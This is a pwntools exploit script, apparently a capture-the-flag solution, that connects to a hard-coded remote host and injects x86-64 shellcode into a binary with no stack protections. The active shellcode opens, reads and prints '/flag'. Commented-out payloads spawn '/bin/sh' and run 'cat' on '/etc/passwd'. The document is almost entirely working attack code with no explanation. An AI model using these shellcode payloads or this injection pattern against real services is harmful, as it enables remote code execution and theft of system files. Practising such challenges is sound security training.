#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./cat.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11662)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()


# asm_shellcode = """
#                 mov rax, 0x101
#                 mov rdi, 0
#                 mov rsi, 444016125487
#                 mov rdx, 0
#                 mov r10, 0
#                 syscall

#                 mov rdi, rax
#                 mov rax, 0x47
#                 mov rsi, 1
#                 mov rdx, 0
#                 mov r10, 0
#                 syscall

# """

asm_shellcode = """
                mov rax, 0x2
                mov rdi, 444016125487
                push 0x0
                push rdi
                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx
                syscall

                mov rsi, rsp
                sub rsp, 0x28
                mov rdi, rax
                xor rax, rax
                mov rdx, 0x28
                syscall

                mov rdx, rax
                mov rax, 0x1
                mov rdi, 0x1
                syscall

                leave
                ret

                """
io.recvuntil("Shellcode: ")
io.send(asm(asm_shellcode))
# shell = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
# io.sendline(shell)
# io.send(b"\xeb\x1f\x5b    \x31\xc0\x88\x43\x0b\x88\x43\x18\x89\x5b\x19\x8d\x4b\x0c\x89\x4b\x1d\x89\x43\x21\xb0\x0b\x8d\x4b\x19\x8d\x53\x21\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x63\x61\x74\x23\x2f\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x41\x4a\x49\x54\x48\x41\x4a\x49\x54\x48\x4b\x50")
io.recvuntil("spbctf")
flag = io.recv().decode()
log.success(f"Flag: spbctf{flag}")

# io.interactive()

io.close()

